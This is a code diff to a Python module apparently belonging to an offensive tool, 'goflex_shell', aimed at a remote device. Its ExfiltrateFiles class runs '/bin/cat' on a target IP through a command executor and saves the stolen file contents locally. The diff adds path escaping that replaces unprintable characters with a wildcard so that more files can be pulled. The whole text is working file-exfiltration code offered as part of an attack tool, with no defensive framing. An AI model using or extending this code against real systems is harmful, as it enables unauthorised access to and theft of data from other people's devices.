@@ -1,10 +1,15 @@
 import os
+import re
 from pathlib import Path
 
 from config import ROOT_DIR
 from goflex_shell.command_executor import CommandExecutor
 from wrappers.base_wrapper import BaseCommand
 from wrappers.list_dir_info import ListPathInfo
+
+CAT_COMMAND = '/bin/cat "{}"'
+UNICODE_ESCAPED_CHAR = re.compile(r"\?+")
+WILDCARD = '"*"'
 
 
 class ExfiltrateFiles(BaseCommand):
@@ -28,7 +33,22 @@ class ExfiltrateFiles(BaseCommand):
                 self._write_to_file(str(full_path), contents)
 
     def _exfiltrate_file_content(self, file_path: str) -> bytes:
-        return CommandExecutor.execute(self.ip, f'/bin/cat "{file_path}"')
+        return CommandExecutor.execute(self.ip, self._generate_cat_command(file_path))
+
+    @staticmethod
+    def _generate_cat_command(file_path: str) -> str:
+        """
+        Escapes the path from unprintable characters. For example:
+
+        "something_unicode_?.txt"
+
+        Will become:
+
+        "something_unicode"*".txt"
+        """
+        escaped_path = UNICODE_ESCAPED_CHAR.sub(WILDCARD, file_path)
+
+        return CAT_COMMAND.format(escaped_path)
 
     def _write_to_file(self, path: str, data: bytes) -> None:
         relative_path_to_file = self._get_relative_path_from_absolute(ROOT_DIR, path)
